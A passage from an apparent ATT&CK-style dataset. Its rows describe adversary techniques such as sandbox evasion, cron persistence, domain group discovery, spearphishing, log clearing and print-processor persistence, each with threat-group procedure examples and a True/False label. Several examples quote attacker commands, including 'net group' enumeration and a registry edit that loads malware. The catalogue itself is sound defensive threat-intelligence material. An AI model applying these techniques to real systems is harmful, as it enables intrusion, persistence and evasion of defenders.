'[EvilBunny] dropper has checked the number of processes and the length and strings of its own file name to identify if the malware is in a sandbox environment.\t', '[yty] has some basic anti-sandbox detection that tries to detect Virtual PC, Sandboxie, and VMware. ', ""[Lucifer] can check for specific usernames, computer names, device drivers, DLL's, and virtual devices associated with sandboxed environments and can enter an infinite loop and stop itself if any are detected."", '[Volt Typhoon] has run system checks to determine if they were operating in a virtualized environment.', '[GravityRAT] uses WMI to check the BIOS and manufacturer information for strings like ""VMWare"", ""Virtual"", and ""XEN"" and another WMI request to get the current temperature of the hardware to determine if it\'s a virtual machine environment. ', '[BadPatch] attempts to detect if it is being run in a Virtual Machine (VM) using a WMI query for disk drive name, BIOS, and motherboard information. ', '[PoetRAT] checked the size of the hard drive to determine if it was being run in a sandbox environment. In the event of sandbox detection, it would delete itself by overwriting the malware scripts with the contents of ""License.txt"" and exiting.', '[WastedLocker] checked if UCOMIEnumConnections and IActiveScriptParseProcedure32 Registry keys were detected as part of its anti-analysis technique.', ""[OopsIE] performs several anti-VM and sandbox checks on the victim's machine. One technique the group has used was to perform a WMI query <code>SELECT * FROM MSAcpi_ThermalZoneTemperature</code> to check the temperature to see if it’s running in a virtual environment."", ""[DarkTortilla] can search a compromised system's running processes and services to detect Hyper-V, QEMU, Virtual PC, Virtual Box, and VMware, as well as Sandboxie."", '[UBoatRAT] checks for virtualization software such as VMWare, VirtualBox, or QEmu on the compromised machine.', '[WhisperGate] can stop its execution when it recognizes the presence of certain monitoring tools.', '[AsyncRAT] can identify strings such as Virtual, vmware, or VirtualBox to detect virtualized environments.', '[Saint Bot] has run several virtual machine and sandbox checks, including checking if `Sbiedll.dll` is present in a list of loaded modules, comparing the machine name to `HAL9TH` and the user name to `JohnDoe`, and checking the BIOS version for known virtual machine identifiers.', ""[Darkhotel] malware has used a series of checks to determine if it's being analyzed; checks include the length of executable names, if a filename ends with <code>.Md5.exe</code>, and if the program is executed from the root of the C:\\ drive, as well as checks for sandbox-related libraries."", '[PlugX] checks if VMware tools is running in the background by searching for any process named ""vmtoolsd"".', '[Shark] can stop execution if the screen width of the targeted machine is not over 600 pixels.', '[Pupy] has a module that checks a number of indicators on the system to determine if its running on a virtual machine.', '[P8RAT] can check the compromised host for processes associated with VMware or VirtualBox environments.', '[Grandoreiro] can detect VMWare via its I/O port and Virtual PC via the <code>vpcext</code> instruction.', '[ROKRAT] can check for VMware-related files and DLLs related to sandboxes.', '[Remcos] searches for Sandboxie and VMware on the system.', ""[Black Basta] can check system flags and libraries, process timing, and API's to detect code emulation or sandboxing."", 'During [Frankenstein] the threat actors used a script that ran WMI queries to check if a VM or sandbox was running, including VMWare and Virtualbox. The script would also call WMI to determine the number of cores allocated to the system; if less than two the script would stop execution.', '[RogueRobin] uses WMI to check BIOS version for VBOX, bochs, qemu, virtualbox, and vm to check for evidence that the script might be executing within an analysis environment. ', '[ObliqueRAT] can halt execution if it identifies processes belonging to virtual machine software or analysis tools.', '[NativeZone] has checked if Vmware or VirtualBox VM is running on a compromised host.', '[Trojan.Karagany] can detect commonly used and generic virtualization platforms based primarily on drivers and file paths.', '[BLUELIGHT] can check to see if the infected machine has VM tools running.', '[Mispadu] can run checks to verify if it is running within a virtualized environments including Hyper-V, VirtualBox or VMWare and will terminate execution if the computer name is “JOHN-PC.”', '[SVCReady] has the ability to determine if its runtime environment is virtualized.', '[Ferocious] can run anti-sandbox checks using the Microsoft Excel 4.0 function <code>GET.WORKSPACE</code> to determine the OS version, if there is a mouse present, and if the host is capable of playing sounds.', '[SUNBURST] checked the domain name of the compromised host to verify it was running in a real environment.', '[Snip3] has the ability to detect Windows Sandbox, VMWare, or VirtualBox by querying `Win32_ComputerSystem` to extract the `Manufacturer` string.', '[GoldMax] will check if it is being run in a virtualized environment by comparing the collected MAC address to <code>c8:27:cc:c2:37:5a</code>.', '[CSPY Downloader] can search loaded modules, PEB structure, file paths, Registry keys, and memory to determine if it is being debugged or running in a virtual environment.', '[DarkGate] queries system resources on an infected machine to identify if it is executing in a sandbox or virtualized environment.', '[OilRig] has used macros to verify if a mouse is connected to a compromised machine.', '[Lazarus Group] has used tools to detect sandbox or VMware services through identifying the presence of a debugger or related services.', '[Frankenstein] has used WMI queries to check if various security applications were running, including VMWare and Virtualbox.']",False
T1053.003,Cron,Adversaries may abuse the <code>cron</code> utility to perform task scheduling for initial or recurring execution of malicious code. The <code>cron</code> utility is a time-based job scheduler for Unix-like operating systems.  The <code> crontab</code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab</code> files are stored in operating system-specific file paths.  An adversary may use <code>cron</code> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for [Persistence] ,"['[SpeakUp] uses cron tasks to ensure persistence. ', '[Anchor] can install itself as a cron job.', '[Janicab] used a cron job for persistence on Mac devices.', '[Skidmap] has installed itself via crontab.', '[Rocke] installed a cron job that downloaded and executed files from the C2.', '[Xbash] can create a cronjob for persistence if it determines it is on a Linux system.', '[NETWIRE] can use crontabs to establish persistence.', 'The [GoldMax] Linux variant has used a crontab entry with a <code>@reboot</code> line to gain persistence.', '[Penquin] can use Cron to create periodic and pre-scheduled background jobs.', '[APT5] has made modifications to the crontab file including in `/var/cron/tabs/`.', '[Kinsing] has used crontab to download and run shell scripts every minute to ensure persistence.', '[APT38] has used cron to create pre-scheduled and periodic background jobs on a Linux system.', '[Exaramel for Linux] uses crontab for persistence if it does not have root privileges.', '[NKAbuse] uses a Cron job to establish persistence when infecting Linux hosts.']",
T1069.002,Domain Groups,"Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.  Commands such as <code>net group /domain</code> of the [Net] utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.","['[Kwampirs] collects a list of domain groups with the command <code>net localgroup /domain</code>.', ""[LAPSUS$] has used the AD Explorer tool to enumerate groups on a victim's network."", 'Commands such as <code>net group /domain</code> can be used in [Net] to gather information about and manipulate groups.', '[BloodHound] can collect information about domain groups and members.', '[SILENTTRINITY] can use `System.DirectoryServices` namespace to retrieve domain group information.', 'During the [SolarWinds Compromise] [APT29] used [AdFind] to enumerate domain groups.', '[ToddyCat] has executed `net group ""domain admins"" /dom` for discovery on compromised machines.', '[GRIFFON] has used a reconnaissance module that can be used to retrieve Windows domain membership information.', '[Volt Typhoon] has run `net group` in compromised environments to discover domain groups.', '[OilRig] has used <code>net group /domain</code>, <code>net group “domain admins” /domain</code>, and <code>net group “Exchange Trusted Subsystem” /domain</code> to find domain group permission settings.', '[AdFind] can enumerate domain groups.', '[Cobalt Strike] can identify targets by querying account groups on a domain contoller.', '[FIN7] has used the command `net group ""domain admins"" /domain` to enumerate domain groups.', '[POWRUNER] may collect domain group information by running <code>net group /domain</code> or a series of other commands on a victim.', 'During [C0015] the threat actors use the command `net group ""domain admins"" /dom` to enumerate domain groups.', '[BlackCat] can determine if a user on a compromised host has domain admin privileges.', '[Brute Ratel C4] can use `net group` for discovery on targeted domains.', '[SoreFang] can enumerate domain groups by executing <code>net.exe group /domain</code>.', '[OSInfo] specifically looks for Domain Admins and power users within the domain. ', '[WellMess] can identify domain group membership for the current user.', '[Egregor] can conduct Active Directory reconnaissance using tools such as Sharphound or [AdFind]', '[BADHATCH] can use `net.exe group ""domain admins"" /domain` to identify Domain Administrators.', '[Ke3chang] performs discovery of permission groups <code>net group /domain</code>.', '[Turla] has used <code>net group ""Domain Admins"" /domain</code> to identify domain administrators.', '[Inception] has used specific malware modules to gather domain membership.', '[Dragonfly] has used batch scripts to enumerate administrators and users in the domain.', '[Helminth] has checked for the domain admin group and Exchange Trusted Subsystem groups using the commands <code>net group Exchange Trusted Subsystem /domain</code> and <code>net group domain admins /domain</code>.', '[CrackMapExec] can gather the user accounts within domain groups.', '[REvil] can identify the domain membership of a compromised host.', '[dsquery] can be used to gather information on permission groups within a domain.', '[APT29] has used [AdFind] to enumerate domain groups.', '[Dragonfly 2.0] used batch scripts to enumerate administrators and users in the domain.', '[Wizard Spider] has used <code>AdFind.exe</code> to collect information about Active Directory groups and accounts.', '[FIN6] has used tools like Adfind to query users, groups, organizational units, and trusts.\t ']",False
T1588.006,Vulnerabilities,"Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.  An adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits] or to attempt to develop one themselves (i.e. [Exploits]","['In 2017, [Sandworm Team] conducted technical research related to vulnerabilities associated with websites used by the Korean Sport and Olympic Committee, a Korean power company, and a Korean airport.']",
T1566.002,Spearphishing Link,"Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.  All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution] The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.  Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an ""IDN homograph attack""). URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an “@” symbol: for example, `hxxp://google.com@1157586937`.  Adversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  [Steal Application Access Token] These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls.   Adversaries may also utilize spearphishing links to [Steal Application Access Token] that grant immediate access to the victim environment. For example, a user may be lured through “consent phishing” into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .  Similarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as “device code phishing,” an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.","['[BlackTech] has used spearphishing e-mails with links to cloud services to deliver malware.', '[Kerrdown] has been distributed via e-mails containing a malicious link.', '[MuddyWater] has sent targeted spearphishing e-mails with malicious links.', '[LuminousMoth] has sent spearphishing emails containing a malicious Dropbox download link.', '[Confucius] has sent malicious links to victims through email campaigns.', '[Mofang] delivered spearphishing emails with malicious links included.', '[Kimsuky] has sent spearphishing emails containing a link to a document that contained malicious macros or took the victim to an actor-controlled domain.', '[Sidewinder] has sent e-mails with malicious links often crafted for specific targets.', '[GuLoader] has been spread in phishing campaigns using malicious web links.', '[OutSteel] has been distributed through malicious links contained within spearphishing emails.', 'During [Night Dragon] threat actors sent spearphishing emails containing links to compromised websites where malware was downloaded.', '[KOCTOPUS] has been distributed as a malicious link within an email.', '[Elderwood] has delivered zero-day exploits and malware to victims via targeted emails containing a link to malicious content hosted on an uncommon Web server.', '[Javali] has been delivered via malicious links embedded in e-mails.', '[DarkGate] is distributed in phishing emails containing links to distribute malicious VBS or MSI files. [DarkGate] uses applications such as Microsoft Teams for distributing links to payloads.', '[Squirrelwaffle] has been distributed through phishing emails containing a malicious URL.', '[Machete] has sent phishing emails that contain a link to an external server with ZIP and RAR archives.', '[AppleJeus] has been distributed via spearphishing link.', '[FIN7] has conducted broad phishing campaigns using malicious links.', '[Emotet] has been delivered by phishing emails containing links. ', 'During [Operation Spalax] the threat actors sent phishing emails to victims that contained a malicious link.', '[Mustard Tempest] has sent victims emails containing links to compromised websites.', '[Sandworm Team] has crafted phishing emails containing malicious hyperlinks.', '[Transparent Tribe] has embedded links to malicious downloads in e-mails.', '[Evilnum] has sent spearphishing emails containing a link to a zip file hosted on Google Drive.', '[Mispadu] has been spread via malicious links embedded in emails.', '[SpicyOmelette] has been distributed via emails containing a malicious link that appears to be a PDF document.', '[Mustang Panda] has delivered malicious links to their intended targets.', '[FIN8] has distributed targeted emails containing links to malicious documents with embedded macros.', '[APT32] has sent spearphishing emails containing malicious links.', '[Pony] has been delivered via spearphishing emails which contained malicious links.\t', '[APT3] has sent spearphishing emails containing malicious links.', '[APT1] has sent spearphishing emails containing hyperlinks to malicious files.', '[Lazarus Group] has sent malicious links to victims via email.', '[Leviathan] has sent spearphishing emails with links, often using a fraudulent lookalike domain and stolen branding.', '[Saint Bot] has been distributed through malicious links contained within spearphishing emails.', '[APT33] has sent spearphishing emails containing links to .hta files.', '[ZIRCONIUM] has used malicious links in e-mails to deliver malware.', '[EXOTIC LILY] has relied on victims to open malicious links in e-mails for execution.', '[AADInternals] can send ""consent phishing"" emails containing malicious links designed to steal users’ access tokens.', '[Bumblebee] has been spread through e-mail campaigns with malicious links.', 'During [C0011] [Transparent Tribe] sent emails containing a malicious link to student targets in India.', '[TrickBot] has been delivered via malicious links in phishing e-mails.', '[Molerats] has sent phishing emails with malicious links included.', '[Magic Hound] has sent malicious URL links through email to victims. In some cases the URLs were shortened or linked to Word documents with malicious macros that executed PowerShells scripts to download [Pupy]', '[SocGholish] has been spread via emails containing malicious links.', '[OilRig] has sent spearphising emails with malicious links to potential victims.', '[Windshift] has sent spearphishing emails with links to harvest credentials and deliver malware.', '[Cobalt Group] has sent emails with URLs pointing to malicious documents.', '[NETWIRE] has been spread via e-mail campaigns utilizing malicious links.', '[APT29] has used spearphishing with a link to trick victims into clicking on a link to a zip file containing malicious files.', '[FIN4] has used spearphishing emails (often sent from compromised accounts) containing malicious links.', 'During [C0021] the threat actors sent phishing emails with unique malicious links, likely for tracking victim clicks.', '[Snip3] has been delivered to victims through e-mail links to malicious files.', '[QakBot] has spread through emails with malicious links. ', '[TA2541] has used spearphishing e-mails with malicious links to deliver malware.   ', '[Hancitor] has been delivered via phishing emails which contained malicious links.', '[APT28] sent spearphishing emails which used a URL-shortener service to masquerade as a legitimate service and to redirect targets to credential harvesting sites.', '[Bazar] has been spread via emails with embedded malicious links.', '[Earth Lusca] has sent spearphishing emails to potential targets that contained a malicious link.', '[Ember Bear] has sent spearphishing emails containing malicious links.', '[Turla] attempted to trick targets into clicking on a link featuring a seemingly legitimate domain from Adobe.com to download their malware and gain initial access.', '[Wizard Spider] has sent phishing emails containing a link to an actor-controlled Google Drive document or other free online file hosting services.', '[Patchwork] has used spearphishing with links to deliver files with exploits to initial victims.', '[TA505] has sent spearphishing emails containing malicious links.', '[LazyScripter] has used spam emails that contain a link that redirects the victim to download a malicious document.', '[Melcoz] has been spread through malicious links embedded in e-mails.', 'During [Operation Dust Storm] the threat actors sent spearphishing emails containing a malicious link.', '[Grandoreiro] has been spread via malicious links embedded in e-mails.', '[Valak] has been delivered via malicious links in e-mail.', '[APT39] leveraged spearphishing emails with malicious links to initially compromise victims.', 'During [Operation Dream Job] [Lazarus Group] sent malicious OneDrive links with fictitious job offer advertisements via email.', '[Stolen Pencil] sent spearphishing emails containing links to domains controlled by the threat actor.', '[Night Dragon] sent spearphishing emails containing links to compromised websites where malware was downloaded.', '[Dragonfly 2.0] used spearphishing with PDF attachments containing malicious links that redirected to credential harvesting websites.']",False
T1070.002,Clear Linux or Mac System Logs,"Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:  * <code>/var/log/messages:</code>: General and system-related messages * <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs * <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records * <code>/var/log/kern.log</code>: Kernel logs * <code>/var/log/cron.log</code>: Crond logs * <code>/var/log/maillog</code>: Mail server logs * <code>/var/log/httpd/</code>: Web server access and error logs ","['[MacMa] can clear possible malware traces such as application logs.', '[TeamTNT] has removed system logs from <code>/var/log/syslog</code>.', '[Rocke] has cleared log files within the /var/log/ folder.', '[Proton] removes logs from <code>/var/logs</code> and <code>/Library/logs</code>.']",
T1499.004,Application or System Exploitation,"Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users.  Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.  Adversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction] [Firmware Corruption] [Service Stop] etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",['[Industroyer] uses a custom DoS tool that leverages CVE-2015-5374 and targets hardcoded IP addresses of Siemens SIPROTEC devices.'],
T1218.004,InstallUtil,Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries.  The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: <code>C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe</code> and <code>C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe</code>.  InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>. ,"['[Chaes] has used Installutill to download content.', '[Mustang Panda] has used <code>InstallUtil.exe</code> to execute a malicious Beacon stager.', '[WhisperGate] has used `InstallUtil.exe` as part of its process to disable Windows Defender.', '[menuPass] has used <code>InstallUtil.exe</code> to execute malicious software.', '[Saint Bot] had used `InstallUtil.exe` to download and deploy executables.']",
T1598.003,Spearphishing Link,"Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts] or [Compromise Accounts] and/or sending multiple, seemingly urgent messages.  All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an “@” symbol: for example, `hxxp://google.com@1157586937`.  Adversaries may also embed “tracking pixels”, ""web bugs"", or ""web beacons"" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.  These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server.   Adversaries may also be able to spoof a complete website using what is known as a ""browser-in-the-browser"" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.  Adversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., [Steal Web Session Cookie] in addition to their username and password. This may enable the adversary to then bypass MFA via [Web Session Cookie]  Adversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as “quishing”). These links may direct a victim to a credential phishing page. By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans. These QR codes may be scanned by or delivered directly  to a user’s mobile device (i.e., [Phishing] which may be less secure in several relevant ways. For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile’s smaller form factor.  From the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains] or [Search Victim-Owned Websites] to craft persuasive and believable lures.","['[Sidewinder] has sent e-mails with malicious links to credential harvesting websites.', '[Mustang Panda] has delivered web bugs to profile their intended targets.', '[Sandworm Team] has crafted spearphishing emails with hyperlinks designed to trick unwitting recipients into revealing their account credentials.', ""[Silent Librarian] has used links in e-mails to direct victims to credential harvesting websites designed to appear like the targeted organization's login page."", '[AADInternals] can send phishing emails containing malicious links designed to collect users’ credentials.', ""[ZIRCONIUM] has used web beacons in e-mails to track hits to attacker-controlled URL's."", '[APT32] has used malicious links to direct users to web pages designed to harvest credentials.', '[Kimsuky] has used links in e-mail to steal account information.', '[Magic Hound] has used SMS and email messages with links designed to steal credentials or track victims.', '[SMOKEDHAM] has been delivered via malicious links in phishing emails.', '[APT28] has conducted credential phishing campaigns with embedded links to attacker-controlled domains.', '[Dragonfly] has used spearphishing with PDF attachments containing malicious links that redirected to credential harvesting websites.', '[Patchwork] has used embedded image tags (known as web bugs) with unique, per-recipient tracking links in their emails for the purpose of identifying which recipients opened messages.']",False
T1021.004,SSH,"Adversaries may use [Valid Accounts] to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.  SSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user’s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.","['[FIN7] has used SSH to move laterally through victim environments.', '[Lazarus Group] used SSH and the PuTTy PSCP utility to gain access to a restricted segment of a compromised network.', '[Leviathan] used ssh for internal reconnaissance.', 'During [Cutting Edge] threat actors used SSH for lateral movement.', 'During the [C0032] campaign, [TEMP.Veles] relied on encrypted SSH-based tunnels to transfer tools and for remote command/program execution.', '[BlackTech] has used Putty for remote access.', '[Empire] contains modules for executing commands over SSH as well as in-memory VNC agent injection.', '[Cobalt Strike] can SSH to a remote service.', '[GCMAN] uses Putty for lateral movement.', '[Kinsing] has used SSH for lateral movement.', '[Fox Kitten] has used the PuTTY and Plink tools for lateral movement.', '[TeamTNT] has used SSH to connect back to victim machines. [TeamTNT] has also used SSH to transfer tools and payloads onto victim hosts and execute them.', '[OilRig] has used Putty to access compromised systems.', '[APT5] has used SSH for lateral movement in compromised environments including for enabling access to ESXi host servers.', '[FIN13] has remotely accessed compromised environments via secure shell (SSH) for lateral movement.', '[menuPass] has used Putty Secure Copy Client (PSCP) to transfer data.', '[Rocke] has spread its coinminer via SSH.\t', '[APT39] used secure shell (SSH) to move laterally among their targets.', '[TEMP.Veles] has relied on encrypted SSH-based tunnels to transfer tools and for remote command/program execution.', '[Cobalt Strike] can SSH to a remote service.']",False
T1098.003,Additional Cloud Roles,"An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments. With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).    This account modification may immediately follow [Create Account] or other malicious account activity. Adversaries may also modify existing [Valid Accounts] that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.  For example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.  In some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account] or modify a victim-owned account.","['During [C0027] [Scattered Spider] used IAM manipulation to gain persistence and to assume or elevate privileges.', 'During the [SolarWinds Compromise] [APT29] granted `company administrator` privileges to a newly created service principle.', 'During [C0027] [Scattered Spider] used IAM manipulation to gain persistence and to assume or elevate privileges.  [Scattered Spider] has also assigned user access admin roles in order to gain Tenant Root Group management permissions in Azure.', ""[LAPSUS$] has added the global admin role to accounts they have created in the targeted organization's cloud instances."", '[APT29] has granted `company administrator` privileges to a newly created service principal. ']",False
T1547.012,Print Processors,"Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.  Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\SYSTEM\\[CurrentControlSet or ControlSet001]\Control\Print\Environments\\[Windows architecture: e.g., Windows x64]\Print Processors\\[user defined]\Driver</code> Registry key that points to the DLL.  For the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the <code>GetPrintProcessorDirectory</code> API call, or referenced via a relative path from this directory. After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.  The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.","['[Gelsemium] can drop itself in <code>C:\\Windows\\System32\\spool\\prtprocs\\x64\\winprint.dll</code> to be loaded automatically by the spoolsv Windows service.', '[Earth Lusca] has added the Registry key `HKLM\\SYSTEM\\ControlSet001\\Control\\Print\\Environments\\Windows x64\\Print Processors\\UDPrint” /v Driver /d “spool.dll /f` to load malware as a Print Processor.', 'The [PipeMon] installer has modified the Registry key <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors</code> to install [PipeMon] as a Print Processor.']",False
T1566.001,Spearphishing Attachment,"Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution] to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.  There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ","['[Cobalt Group] has sent spearphishing emails with various attachment types to corporate and personal email accounts of victim organizations. Attachment types have included .rtf, .doc, .xls, archives containing LNK files, and password protected archives containing .exe and .scr executables.', '[KOCTOPUS] has been distributed via spearphishing emails with malicious attachments.', '[Ember Bear] has sent spearphishing emails containing malicious attachments in the form of PDFs, Word documents, JavaScript files, and Control Panel File (CPL) executables. ', 'During the [2015 Ukraine Electric Power Attack] [Sandworm Team] obtained their initial foothold into many IT systems using Microsoft Office attachments delivered through phishing emails. ', '[Lokibot] is delivered via a malicious XLS attachment contained within a spearhpishing email. ', '[Lazarus Group] has targeted victims with spearphishing emails containing malicious Microsoft Word documents.', 'The primary delivered mechanism for [Agent Tesla] is through email phishing messages. ', '[Tropic Trooper] sent spearphishing emails that contained malicious Microsoft Office and fake installer file attachments.', '[FIN6] has targeted victims with e-mails containing malicious attachments.', '[SVCReady] has been distributed via spearphishing campaigns containing malicious Mircrosoft Word documents.', '[APT28] sent spearphishing emails containing malicious Microsoft Office and RAR attachments.', '[DarkTortilla] has been distributed via spearphishing emails containing archive attachments, with file types such as .iso, .zip, .img, .dmg, and .tar, as well as through malicious documents.', '[admin@338] has sent emails with malicious Microsoft Office documents attached.', '[Windshift] has sent spearphishing emails with attachment to harvest credentials and deliver malware.', '[BRONZE BUTLER] used spearphishing emails with malicious Microsoft Word attachments to infect victims.', '[WIRTE] has sent emails to intended victims with malicious MS Word and Excel attachments.', '[MuddyWater] has compromised third parties and used compromised accounts to send spearphishing emails with targeted attachments to recipients.\t', '[menuPass] has sent malicious Office documents via email as part of spearphishing campaigns as well as executables disguised as documents.', '[PoetRAT] was distributed via malicious Word documents.', '[RTM] has been delivered via spearphishing attachments disguised as PDF documents.', '[Threat Group-3390] has used e-mail to deliver malicious attachments to victims.', '[Gamaredon Group] has delivered spearphishing emails with malicious attachments to targets.', '[AppleSeed] has been distributed to victims through malicious e-mail attachments.', '[Ramsay] has been distributed through spearphishing emails with malicious attachments.', '[APT32] has sent spearphishing emails with a malicious executable disguised as a document or spreadsheet.', '[Darkhotel] has sent spearphishing emails with malicious RAR and .LNK attachments.', '[BITTER] has sent spearphishing emails with a malicious RTF document or Excel spreadsheet.', '[APT29] has used spearphishing emails with an attachment to deliver files with exploits to initial victims.', '[Taidoor] has been delivered through spearphishing emails.', '[Kerrdown] has been distributed through malicious e-mail attachments.', '[Inception] has used weaponized documents attached to spearphishing emails for reconnaissance and initial compromise.', 'During [Frankenstein] the threat actors likely used spearphishing emails to send malicious Microsoft Word documents.', '[Metamorfo] has been delivered to victims via emails with malicious HTML attachments. ', '[EXOTIC LILY] conducted an e-mail thread-hijacking campaign with malicious ISO attachments.', '[Ajax Security Team] has used personalized spearphishing attachments.', '[Chaes] has been delivered by sending victims a phishing email containing a malicious .docx file.', '[Dragonfly] has sent emails with malicious attachments to gain initial access.', '[Sandworm Team] has delivered malicious Microsoft Office attachments via spearphishing emails.', '[Elderwood] has delivered zero-day exploits and malware to victims via targeted emails containing malicious attachments.', 'For [C0015] security researchers assessed the threat actors likely used a phishing campaign to distribute a weaponized attachment to victims.', '[APT33] has sent spearphishing e-mails with archive attachments.', '[Hancitor] has been delivered via phishing emails with malicious attachments.', '[Molerats] has sent phishing emails with malicious 